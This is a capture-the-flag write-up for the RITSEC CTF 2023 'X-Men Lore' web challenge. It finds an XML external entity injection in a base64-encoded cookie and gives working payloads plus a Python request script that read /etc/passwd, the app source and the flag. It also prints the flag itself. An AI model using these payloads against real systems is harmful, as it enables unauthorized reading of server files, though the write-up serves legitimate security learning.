# X-Men Lore

- 238 Points / 227 Solves

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

The 90's X-Men Animated Series is better than the movies. Change my mind.

[https://xmen-lore-web.challenges.ctf.ritsec.club/](https://xmen-lore-web.challenges.ctf.ritsec.club/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401142159.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401142237.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401142246.png)

In here, we can choose an X-Men Character.

**View source page:**
```html
 <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4='">
      Beast
    </button>
  </a>
  <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+U3Rvcm08L3htZW4+PC9pbnB1dD4='">
      Storm
    </button>
  </a>
  <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+SmVhbiBHcmV5PC94bWVuPjwvaW5wdXQ+'">
      Jean Grey
    </button>
  </a>
  <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+V29sdmVyaW5lPC94bWVuPjwvaW5wdXQ+'">
      Wolverine
    </button>
  </a>
  <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+Q3ljbG9wczwveG1lbj48L2lucHV0Pg=='">
      Cyclops
    </button>
  </a>
  <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+R2FtYml0PC94bWVuPjwvaW5wdXQ+'">
      Gambit
    </button>
  </a>
  <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+Um9ndWU8L3htZW4+PC9pbnB1dD4='">
      Rogue
    </button>
  </a>
  <a href="/xmen">
    <button
      onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+SnViaWxlZTwveG1lbj48L2lucHV0Pg=='">
      Jubilee
    </button>
  </a>
```

When we click those buttons, **it'll set a new cookie for us**, and the key is `xmen`, value is encoded in base64. You can tell it's base64 encoded is because the last character has `=`, which is a padding in base64 encoding.

**Let's click on the "Beast" button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401142517.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401142538.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401142545.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401142636.png)

**Hmm... Let's decode that base64 string:**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023)-[2023.04.01|14:24:43(HKT)]
└> echo 'PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4=' | base64 -d
<?xml version='1.0' encoding='UTF-8'?><input><xmen>Beast</xmen></input>
```

**Oh! It's an XML data:**
```xml
<?xml version='1.0' encoding='UTF-8'?>
<input>
    <xmen>Beast</xmen>
</input>
```

Maybe the server-side will decode our `xmen` cookie, then parse it's value to the XML parser?

That being said, we can try ***XXE (XML External Entity) injection***!

## Exploitation

But first, let's try to change the `<xmen>` element's value to anything and see what will happened:

**encode_xml.py:**
```py
#!/usr/bin/env python3

from base64 import b64encode

def main():
    payload = b'''<?xml version='1.0' encoding='UTF-8'?><input><xmen>anything</xmen></input>'''
    base64Encoded = b64encode(payload)
    print(base64Encoded.decode())

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/X-Men-Lore)-[2023.04.01|14:33:49(HKT)]
└> python3 encode_xml.py
PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+YW55dGhpbmc8L3htZW4+PC9pbnB1dD4=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401143529.png)

Cool! It's ***reflected to the response***!!

**With that said, we can craft a payload to display the file content of `/etc/passwd`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<input>
    <xmen>&xxe;</xmen>
</input>
```

**What this payload does is we defined:**

-   The root element of the document is `root` (`!DOCTYPE root`)
-   Then, inside that root element, **we defined an external entity (variable) called `xxe`, which is using keyword `SYSTEM` to fetch file `/etc/passwd`**
-   Finally, we want to **use the `xxe` entity in `<xmen>` tag**, so we can see the output of `/etc/passwd`. To do so, we need to use `&entity_name;`

```py
    payload = b'''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><input><xmen>&xxe;</xmen></input>'''
```

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/X-Men-Lore)-[2023.04.01|14:34:09(HKT)]
└> python3 encode_xml.py
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcm9vdCBbIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+IF0+PGlucHV0Pjx4bWVuPiZ4eGU7PC94bWVuPjwvaW5wdXQ+
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401143745.png)

Nice! We can confirm the `xmen` cookie is indeed vulnerable to XXE!!

But where's the flag??

Hmm... Let's ***view the server-side's source code***!

**During sending the payload request, I found that the response has a `Server` header:**
```http
Server: gunicorn
```

> _Gunicorn_ is a pure Python WSGI server with simple configuration and multiple worker implementations for performance tuning.

That being said, the back-end is using Python. Which means there's only 2 back-end web framework in Python: **Flask and Django**.

Usually the main application file is called `app.py`.

**After some testing, I found the source code is in `/home/user/app.py`:**
```py
#!/usr/bin/env python3

from base64 import b64encode
import requests

def main():
    payload = b'''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///home/user/app.py"> ]><input><xmen>&xxe;</xmen></input>'''
    base64Encoded = b64encode(payload).decode()
    cookie = {
        'xmen': base64Encoded
    }
    URL = 'https://xmen-lore-web.challenges.ctf.ritsec.club/xmen'

    xmenResult = requests.get(URL, cookies=cookie)
    print(xmenResult.text)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/X-Men-Lore)-[2023.04.01|14:52:39(HKT)]
└> python3 encode_xml.py
<!DOCTYPE html>
<head>
  <title>X-Men Lore</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<a href="/"><button>Home</button></a>
<body>
  
    
      <h1>from flask import Flask, render_template, request, redirect, url_for
import lxml.etree as ET
from base64 import b64decode
app = Flask(__name__)

@app.route(&#34;/&#34;)
def index():
  return render_template(&#34;index.html&#34;)

@app.route(&#34;/xmen&#34;)
def xmen():
  cookie = request.cookies.get(&#34;xmen&#34;)
  try:
    b64decode(cookie)
    data = ET.fromstring(b64decode(cookie))
  except:
    return redirect(url_for(&#34;index&#34;))
  return render_template(&#34;xmen.html&#34;, data=data)
</h1>
      <img src="/static/from flask import Flask, render_template, request, redirect, url_for
import lxml.etree as ET
from base64 import b64decode
app = Flask(__name__)

@app.route(&#34;/&#34;)
def index():
  return render_template(&#34;index.html&#34;)

@app.route(&#34;/xmen&#34;)
def xmen():
  cookie = request.cookies.get(&#34;xmen&#34;)
  try:
    b64decode(cookie)
    data = ET.fromstring(b64decode(cookie))
  except:
    return redirect(url_for(&#34;index&#34;))
  return render_template(&#34;xmen.html&#34;, data=data)
.jpg" alt="[...]" />
      <br/>
      <iframe src="/static/[...]
"></iframe>
    
  
</body>
```

**`/home/user/app.py`:**
```py
from flask import Flask, render_template, request, redirect, url_for
import lxml.etree as ET
from base64 import b64decode
app = Flask(__name__)

@app.route('/')
def index():
  return render_template('index.html')

@app.route('/xmen')
def xmen():
  cookie = request.cookies.get('xmen')
  try:
    b64decode(cookie)
    data = ET.fromstring(b64decode(cookie))
  except:
    return redirect(url_for('index'))
  return render_template('xmen.html', data=data)
```

Hmm... Nothing weird...

**After some "guessing", I found that the flag is in `/flag`:**
```py
    payload = b'''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///flag"> ]><input><xmen>&xxe;</xmen></input>'''
```

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/X-Men-Lore)-[2023.04.01|15:04:31(HKT)]
└> python3 encode_xml.py
<!DOCTYPE html>
<head>
  <title>X-Men Lore</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<a href="/"><button>Home</button></a>
<body>
  
    
      <h1>RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
</h1>
      <img src="/static/RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
.jpg" alt="RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
" />
      <br/>
      <iframe src="/static/RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
.html" title="RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
"></iframe>
    
  
</body>
```

Nice!

- **Flag: `RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}`**

## Conclusion

What we've learned:

1. XML External Entity (XXE) Injection